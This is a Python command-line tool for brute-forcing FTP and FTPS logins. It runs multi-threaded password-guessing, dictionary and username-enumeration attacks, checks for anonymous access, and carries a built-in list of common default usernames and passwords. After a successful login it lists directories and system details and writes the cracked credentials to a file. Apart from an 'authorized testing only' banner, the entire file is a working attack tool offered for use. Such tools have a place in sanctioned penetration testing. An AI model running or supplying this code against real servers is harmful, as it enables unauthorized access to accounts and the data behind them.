#!/usr/bin/env python3
"""
FTP Brute Force Tool
A comprehensive utility for testing FTP server security through controlled
brute force attacks. Supports multiple FTP protocols, anonymous access testing,
and intelligent attack patterns with proper error handling.
"""

import argparse
import sys
import os
import threading
import queue
import time
import logging
import socket
from datetime import datetime
from typing import List, Tuple, Optional, Dict
from concurrent.futures import ThreadPoolExecutor, as_completed
import ftplib
from ftplib import FTP, FTP_TLS, error_perm, error_temp, error_reply

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()  # Initialize colorama for Windows support
except ImportError:
    COLORAMA_AVAILABLE = False

class FTPBruteForcer:
    """
    Main class for FTP brute force operations
    Handles connection testing, credential validation, and multi-threaded attacks
    """
    
    # Common FTP ports
    DEFAULT_PORTS = [21, 2121, 21, 990, 2221]
    
    # FTP response codes
    FTP_CODES = {
        220: "Service ready",
        221: "Goodbye",
        230: "User logged in",
        331: "Password required",
        332: "Need account for login",
        421: "Service not available",
        425: "Can't open data connection",
        426: "Connection closed",
        430: "Invalid username or password",
        434: "Requested host unavailable",
        500: "Syntax error",
        501: "Syntax error in parameters",
        503: "Bad sequence of commands",
        504: "Command not implemented",
        530: "Not logged in",
        532: "Need account for storing files",
        550: "File unavailable"
    }
    
    def __init__(self, target: str, port: int = 21, use_tls: bool = False,
                 timeout: int = 10, verbose: bool = False, passive: bool = True):
        """
        Initialize FTP brute forcer
        
        Args:
            target: Target IP or hostname
            port: FTP port (default: 21)
            use_tls: Use FTP over TLS (FTPS)
            timeout: Connection timeout in seconds
            verbose: Enable verbose output
            passive: Use passive mode
        """
        self.target = target
        self.port = port
        self.use_tls = use_tls
        self.timeout = timeout
        self.verbose = verbose
        self.passive = passive
        
        # Statistics and state
        self.found_credentials = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.stats = {
            'attempts': 0,
            'successes': 0,
            'failures': 0,
            'connection_errors': 0,
            'start_time': None
        }
        
        # Setup logging
        self.setup_logging()
        
        # Validate target
        self.validate_target()
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('FTPBruteForcer')
        
        # Remove existing handlers
        self.logger.handlers.clear()
        
        # Create console handler
        handler = logging.StreamHandler()
        
        # Set format based on colorama availability
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        
        # Set log level
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def validate_target(self):
        """Validate target is reachable and FTP port is open"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result != 0:
                self.logger.warning(
                    f"Target {self.target}:{self.port} appears unreachable. "
                    "Connection may fail."
                )
            else:
                self.logger.info(f"Target {self.target}:{self.port} is reachable")
                
                # Try to get FTP banner
                banner = self.get_banner()
                if banner:
                    self.logger.info(f"FTP Banner: {banner}")
                
        except Exception as e:
            self.logger.error(f"Target validation failed: {e}")
    
    def get_banner(self) -> Optional[str]:
        """
        Retrieve FTP banner from target
        
        Returns:
            Banner string or None
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            banner = sock.recv(1024).decode('utf-8', errors='ignore').strip()
            sock.close()
            return banner
        except:
            return None
    
    def test_anonymous_access(self) -> bool:
        """
        Test if anonymous FTP access is allowed
        
        Returns:
            True if anonymous access is allowed
        """
        try:
            if self.use_tls:
                ftp = FTP_TLS()
                ftp.connect(self.target, self.port, timeout=self.timeout)
                ftp.auth()  # TLS authentication
            else:
                ftp = FTP()
                ftp.connect(self.target, self.port, timeout=self.timeout)
            
            ftp.login('anonymous', 'anonymous@example.com')
            ftp.quit()
            
            self.logger.info("[+] Anonymous FTP access allowed!")
            return True
            
        except (error_perm, error_temp, error_reply) as e:
            self.logger.debug(f"Anonymous access denied: {e}")
            return False
        except Exception as e:
            self.logger.debug(f"Anonymous access test failed: {e}")
            return False
    
    def test_connection(self, username: str, password: str) -> Tuple[bool, Optional[str], Optional[str]]:
        """
        Test FTP connection with given credentials
        
        Args:
            username: Username to test
            password: Password to test
        
        Returns:
            Tuple of (success, error_message, welcome_message)
        """
        ftp = None
        try:
            # Create FTP connection based on TLS setting
            if self.use_tls:
                ftp = FTP_TLS()
                ftp.connect(self.target, self.port, timeout=self.timeout)
                ftp.auth()  # TLS authentication
                ftp.prot_p()  # Set secure data connection
            else:
                ftp = FTP()
                ftp.connect(self.target, self.port, timeout=self.timeout)
            
            # Set passive mode
            ftp.set_pasv(self.passive)
            
            # Attempt login
            response = ftp.login(username, password)
            
            # Get welcome message
            welcome = ftp.getwelcome()
            
            # Try to list directory to verify full access
            try:
                files = ftp.nlst()
                list_success = True
            except:
                list_success = False
            
            ftp.quit()
            
            return True, None, welcome
            
        except error_perm as e:
            error_msg = str(e)
            if "530" in error_msg:
                return False, "Invalid credentials", None
            return False, f"Permission error: {error_msg}", None
            
        except error_temp as e:
            return False, f"Temporary error: {str(e)}", None
            
        except error_reply as e:
            return False, f"Reply error: {str(e)}", None
            
        except socket.timeout:
            return False, "Connection timeout", None
            
        except socket.error as e:
            return False, f"Socket error: {str(e)}", None
            
        except Exception as e:
            return False, f"Unexpected error: {str(e)}", None
            
        finally:
            if ftp:
                try:
                    ftp.close()
                except:
                    pass
    
    def get_system_info(self, username: str, password: str) -> Dict:
        """
        Get system information after successful login
        
        Args:
            username: Valid username
            password: Valid password
        
        Returns:
            Dictionary with system information
        """
        info = {}
        ftp = None
        
        try:
            if self.use_tls:
                ftp = FTP_TLS()
                ftp.connect(self.target, self.port, timeout=self.timeout)
                ftp.auth()
                ftp.prot_p()
            else:
                ftp = FTP()
                ftp.connect(self.target, self.port, timeout=self.timeout)
            
            ftp.set_pasv(self.passive)
            ftp.login(username, password)
            
            # Get system type
            try:
                info['system'] = ftp.sendcmd('SYST')
            except:
                info['system'] = 'Unknown'
            
            # Get current directory
            try:
                info['pwd'] = ftp.pwd()
            except:
                info['pwd'] = 'Unknown'
            
            # Get features
            try:
                features = ftp.sendcmd('FEAT')
                info['features'] = features.split('\n')
            except:
                info['features'] = []
            
            # Get directory listing
            try:
                files = []
                ftp.dir(lambda x: files.append(x))
                info['files'] = files[:10]  # First 10 files
            except:
                info['files'] = []
            
            ftp.quit()
            
        except Exception as e:
            self.logger.debug(f"Failed to get system info: {e}")
        finally:
            if ftp:
                try:
                    ftp.close()
                except:
                    pass
        
        return info
    
    def worker(self, task_queue: queue.Queue, results_queue: queue.Queue):
        """
        Worker thread for processing credential attempts
        
        Args:
            task_queue: Queue with (username, password) tuples
            results_queue: Queue for successful results
        """
        while not self.stop_event.is_set():
            try:
                username, password = task_queue.get(timeout=1)
            except queue.Empty:
                break
            
            # Test credentials
            success, error, welcome = self.test_connection(username, password)
            
            # Update statistics
            with self.lock:
                self.stats['attempts'] += 1
                if success:
                    self.stats['successes'] += 1
                    result = {
                        'username': username,
                        'password': password,
                        'timestamp': datetime.now().isoformat(),
                        'target': f"{self.target}:{self.port}",
                        'welcome': welcome
                    }
                    self.found_credentials.append(result)
                    results_queue.put(result)
                    
                    # Log success with colors
                    if COLORAMA_AVAILABLE:
                        self.logger.info(
                            f"{Fore.GREEN}[+] SUCCESS: {username}:{password}{Style.RESET_ALL}"
                        )
                    else:
                        self.logger.info(f"[+] SUCCESS: {username}:{password}")
                else:
                    self.stats['failures'] += 1
                    
                    # Log failures in verbose mode
                    if self.verbose and error:
                        if COLORAMA_AVAILABLE:
                            self.logger.debug(
                                f"{Fore.RED}[-] Failed: {username}:{password} - {error}{Style.RESET_ALL}"
                            )
                        else:
                            self.logger.debug(f"[-] Failed: {username}:{password} - {error}")
            
            task_queue.task_done()
            
            # Small delay to prevent overwhelming the server
            time.sleep(0.1)
    
    def brute_force(self, usernames: List[str], passwords: List[str],
                   threads: int = 5, max_attempts: Optional[int] = None,
                   stop_on_success: bool = True) -> List[Dict]:
        """
        Perform brute force attack
        
        Args:
            usernames: List of usernames to test
            passwords: List of passwords to test
            threads: Number of concurrent threads
            max_attempts: Maximum number of attempts
            stop_on_success: Stop when first credential is found
        
        Returns:
            List of found credentials
        """
        self.logger.info(f"[*] Starting FTP brute force attack")
        self.logger.info(f"[*] Target: {self.target}:{self.port}")
        self.logger.info(f"[*] FTPS: {'Yes' if self.use_tls else 'No'}")
        self.logger.info(f"[*] Usernames: {len(usernames)}")
        self.logger.info(f"[*] Passwords: {len(passwords)}")
        self.logger.info(f"[*] Total combinations: {len(usernames) * len(passwords):,}")
        self.logger.info(f"[*] Threads: {threads}")
        
        # Create task queue
        task_queue = queue.Queue()
        results_queue = queue.Queue()
        
        # Populate task queue
        attempt_count = 0
        for username in usernames:
            for password in passwords:
                task_queue.put((username, password))
                attempt_count += 1
                if max_attempts and attempt_count >= max_attempts:
                    break
            if max_attempts and attempt_count >= max_attempts:
                break
        
        total_attempts = attempt_count
        self.stats['start_time'] = time.time()
        
        # Start worker threads
        thread_list = []
        for _ in range(min(threads, total_attempts)):
            t = threading.Thread(
                target=self.worker,
                args=(task_queue, results_queue),
                daemon=True
            )
            t.start()
            thread_list.append(t)
        
        # Monitor progress
        last_attempts = 0
        try:
            while any(t.is_alive() for t in thread_list) and not self.stop_event.is_set():
                time.sleep(2)
                
                # Check for results
                while not results_queue.empty():
                    result = results_queue.get()
                    if stop_on_success:
                        self.logger.info("[*] Stopping attack - credentials found")
                        self.stop_event.set()
                        return self.found_credentials
                
                # Update progress
                current_attempts = self.stats['attempts']
                if current_attempts > last_attempts:
                    elapsed = time.time() - self.stats['start_time']
                    rate = current_attempts / elapsed if elapsed > 0 else 0
                    percent = (current_attempts / total_attempts) * 100
                    
                    if COLORAMA_AVAILABLE:
                        self.logger.info(
                            f"{Fore.CYAN}[*] Progress: {current_attempts:,}/{total_attempts:,} "
                            f"({percent:.1f}%) | Rate: {rate:.1f}/s | "
                            f"Found: {len(self.found_credentials)}{Style.RESET_ALL}"
                        )
                    else:
                        self.logger.info(
                            f"[*] Progress: {current_attempts:,}/{total_attempts:,} "
                            f"({percent:.1f}%) | Rate: {rate:.1f}/s | "
                            f"Found: {len(self.found_credentials)}"
                        )
                    
                    last_attempts = current_attempts
                
        except KeyboardInterrupt:
            self.logger.info("[!] Interrupted by user")
            self.stop_event.set()
        
        # Wait for threads to finish
        for t in thread_list:
            t.join(timeout=2)
        
        # Final statistics
        elapsed = time.time() - self.stats['start_time']
        self.logger.info(f"[*] Attack completed in {elapsed:.2f} seconds")
        self.logger.info(f"[*] Total attempts: {self.stats['attempts']:,}")
        self.logger.info(f"[*] Successful: {len(self.found_credentials)}")
        
        return self.found_credentials
    
    def dictionary_attack(self, username: str, password_file: str,
                          threads: int = 5) -> List[Dict]:
        """
        Perform dictionary attack with single username
        
        Args:
            username: Username to test
            password_file: File containing passwords
            threads: Number of threads
        
        Returns:
            List of found credentials
        """
        # Load passwords
        passwords = self.load_wordlist(password_file)
        if not passwords:
            self.logger.error("[-] No passwords loaded")
            return []
        
        return self.brute_force([username], passwords, threads)
    
    def username_enumeration(self, password: str, username_file: str,
                            threads: int = 5) -> List[Dict]:
        """
        Enumerate valid usernames with single password
        
        Args:
            password: Password to test
            username_file: File containing usernames
            threads: Number of threads
        
        Returns:
            List of found credentials
        """
        # Load usernames
        usernames = self.load_wordlist(username_file)
        if not usernames:
            self.logger.error("[-] No usernames loaded")
            return []
        
        return self.brute_force(usernames, [password], threads)
    
    def load_wordlist(self, wordlist_file: str) -> List[str]:
        """
        Load words from a file
        
        Args:
            wordlist_file: Path to wordlist file
        
        Returns:
            List of words
        """
        words = []
        try:
            with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as f:
                words = [line.strip() for line in f if line.strip()]
            self.logger.info(f"[+] Loaded {len(words)} entries from {wordlist_file}")
        except FileNotFoundError:
            self.logger.error(f"[-] File not found: {wordlist_file}")
        except Exception as e:
            self.logger.error(f"[-] Error loading wordlist: {e}")
        
        return words
    
    def generate_common_credentials(self) -> Tuple[List[str], List[str]]:
        """
        Generate common FTP usernames and passwords
        
        Returns:
            Tuple of (usernames list, passwords list)
        """
        common_usernames = [
            'anonymous', 'ftp', 'ftpuser', 'user', 'admin', 'root',
            'test', 'guest', 'ftpadmin', 'webmaster', 'backup',
            'upload', 'download', 'public', 'incoming', 'outgoing'
        ]
        
        common_passwords = [
            'anonymous', 'ftp', 'ftpuser', 'user', 'admin', 'root',
            'test', 'guest', 'password', '123456', 'password123',
            'ftp123', 'admin123', 'root123', 'backup', 'upload',
            'download', 'public', '', 'ftpuser', 'changeme'
        ]
        
        return common_usernames, common_passwords
    
    def save_results(self, output_file: str):
        """
        Save found credentials to file
        
        Args:
            output_file: Output file path
        """
        if not self.found_credentials:
            self.logger.info("[-] No credentials to save")
            return
        
        try:
            with open(output_file, 'w') as f:
                f.write("FTP Brute Force Results\n")
                f.write("=" * 50 + "\n")
                f.write(f"Target: {self.target}:{self.port}\n")
                f.write(f"FTPS: {'Yes' if self.use_tls else 'No'}\n")
                f.write(f"Date: {datetime.now().isoformat()}\n")
                f.write(f"Total attempts: {self.stats['attempts']:,}\n")
                f.write("=" * 50 + "\n\n")
                
                for cred in self.found_credentials:
                    f.write(f"Username: {cred['username']}\n")
                    f.write(f"Password: {cred['password']}\n")
                    f.write(f"Timestamp: {cred['timestamp']}\n")
                    if cred.get('welcome'):
                        f.write(f"Welcome: {cred['welcome']}\n")
                    f.write("-" * 30 + "\n")
            
            self.logger.info(f"[+] Results saved to: {output_file}")
            
        except Exception as e:
            self.logger.error(f"[-] Failed to save results: {e}")

def parse_list_input(input_str: str) -> List[str]:
    """
    Parse input string that could be a file or comma-separated list
    
    Args:
        input_str: File path or comma-separated list
    
    Returns:
        List of items
    """
    items = []
    
    # Check if input is a file
    if os.path.isfile(input_str):
        with open(input_str, 'r', encoding='utf-8', errors='ignore') as f:
            items = [line.strip() for line in f if line.strip()]
    else:
        # Comma-separated list
        items = [item.strip() for item in input_str.split(',') if item.strip()]
    
    return items

def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    FTP Brute Force Tool
    For authorized security testing only
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.CYAN}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)

def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='FTP Brute Force Tool - Test FTP server authentication security',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Dictionary attack with single username
  python ftp_bruteforce.py 192.168.1.100 -u admin -P passwords.txt
  
  # Multi-user, multi-password attack
  python ftp_bruteforce.py 192.168.1.100 -U users.txt -P passwords.txt -t 10
  
  # Test anonymous access
  python ftp_bruteforce.py 192.168.1.100 --anonymous
  
  # FTPS (FTP over TLS) attack
  python ftp_bruteforce.py 192.168.1.100 --tls -u admin -P passwords.txt
  
  # Username enumeration
  python ftp_bruteforce.py 192.168.1.100 --enum-users passwords.txt -p "password123"
  
  # Get system info after successful login
  python ftp_bruteforce.py 192.168.1.100 -u admin -P passwords.txt --info -o results.txt
        """
    )
    
    # Target arguments
    parser.add_argument('target', help='Target IP address or hostname')
    parser.add_argument('--port', '-p', type=int, default=21,
                       help='FTP port (default: 21)')
    parser.add_argument('--tls', action='store_true',
                       help='Use FTP over TLS (FTPS)')
    parser.add_argument('--timeout', type=int, default=10,
                       help='Connection timeout in seconds (default: 10)')
    parser.add_argument('--active', action='store_true',
                       help='Use active mode instead of passive')
    
    # Credential arguments
    user_group = parser.add_mutually_exclusive_group()
    user_group.add_argument('-u', '--username', help='Single username')
    user_group.add_argument('-U', '--usernames', help='Usernames file or comma-separated list')
    
    pass_group = parser.add_mutually_exclusive_group()
    pass_group.add_argument('-P', '--passwords', help='Passwords file or comma-separated list')
    pass_group.add_argument('--enum-users', action='store_true',
                           help='Enumerate usernames with single password')
    
    # Attack options
    parser.add_argument('--anonymous', action='store_true',
                       help='Test anonymous FTP access')
    parser.add_argument('--info', action='store_true',
                       help='Get system information after successful login')
    parser.add_argument('--common', action='store_true',
                       help='Use common FTP credentials')
    parser.add_argument('-t', '--threads', type=int, default=5,
                       help='Number of threads (default: 5)')
    parser.add_argument('--max-attempts', type=int,
                       help='Maximum number of attempts')
    parser.add_argument('--no-stop', action='store_true',
                       help='Continue after finding credentials')
    
    # Output options
    parser.add_argument('-o', '--output', help='Output file for results')
    parser.add_argument('-v', '--verbose', action='store_true',
                       help='Verbose output')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    try:
        # Initialize brute forcer
        forcer = FTPBruteForcer(
            target=args.target,
            port=args.port,
            use_tls=args.tls,
            timeout=args.timeout,
            verbose=args.verbose,
            passive=not args.active
        )
        
        # Test anonymous access if requested
        if args.anonymous:
            print("\n[*] Testing anonymous FTP access...")
            if forcer.test_anonymous_access():
                # Get system info for anonymous session
                if args.info:
                    info = forcer.get_system_info('anonymous', 'anonymous@example.com')
                    print("\nAnonymous Session Info:")
                    for key, value in info.items():
                        if key != 'files':
                            print(f"  {key}: {value}")
                        else:
                            print(f"  Files (first 10):")
                            for f in value[:10]:
                                print(f"    - {f}")
            else:
                print("[-] Anonymous access not allowed")
            
            if not args.usernames and not args.username:
                sys.exit(0)
        
        # Prepare usernames
        usernames = []
        if args.username:
            usernames = [args.username]
        elif args.usernames:
            usernames = parse_list_input(args.usernames)
        elif args.common:
            usernames, _ = forcer.generate_common_credentials()
        elif not args.anonymous:
            print("[-] Username(s) required. Use -u, -U, --common, or --anonymous")
            sys.exit(1)
        
        # Prepare passwords
        passwords = []
        if args.passwords:
            passwords = parse_list_input(args.passwords)
        elif args.enum_users:
            if not args.passwords:
                print("[-] Password required for username enumeration")
                sys.exit(1)
        elif args.common:
            _, passwords = forcer.generate_common_credentials()
        elif not args.anonymous:
            print("[-] Password(s) required. Use -P, --enum-users, or --common")
            sys.exit(1)
        
        # Perform attack
        found = []
        
        if args.enum_users and usernames and args.passwords:
            # Username enumeration mode
            print(f"\n[*] Username enumeration mode")
            print(f"[*] Testing password: {args.passwords}")
            print(f"[*] Username list: {len(usernames)} entries\n")
            
            found = forcer.username_enumeration(
                password=args.passwords,
                username_file=args.usernames if args.usernames else None,
                threads=args.threads
            )
            
        elif usernames and passwords:
            # Standard brute force mode
            print(f"\n[*] Standard brute force mode")
            print(f"[*] Usernames: {len(usernames)}")
            print(f"[*] Passwords: {len(passwords)}")
            print(f"[*] Total combinations: {len(usernames) * len(passwords):,}\n")
            
            found = forcer.brute_force(
                usernames=usernames,
                passwords=passwords,
                threads=args.threads,
                max_attempts=args.max_attempts,
                stop_on_success=not args.no_stop
            )
        
        # Get system info for successful credentials if requested
        if args.info and found:
            print("\n[*] Retrieving system information for found credentials:")
            for cred in found:
                print(f"\n  Credentials: {cred['username']}:{cred['password']}")
                info = forcer.get_system_info(cred['username'], cred['password'])
                for key, value in info.items():
                    if key != 'files':
                        print(f"    {key}: {value}")
                    else:
                        print(f"    Files (first 10):")
                        for f in value[:10]:
                            print(f"      - {f}")
        
        # Save results if requested
        if args.output and found:
            forcer.save_results(args.output)
        
        # Display summary
        if found:
            print(f"\n{'='*60}")
            print(f"[+] SUCCESS! Found {len(found)} credential(s):")
            for cred in found:
                print(f"    {cred['username']}:{cred['password']}")
            print(f"{'='*60}\n")
        elif not args.anonymous:
            print(f"\n[-] No valid credentials found\n")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
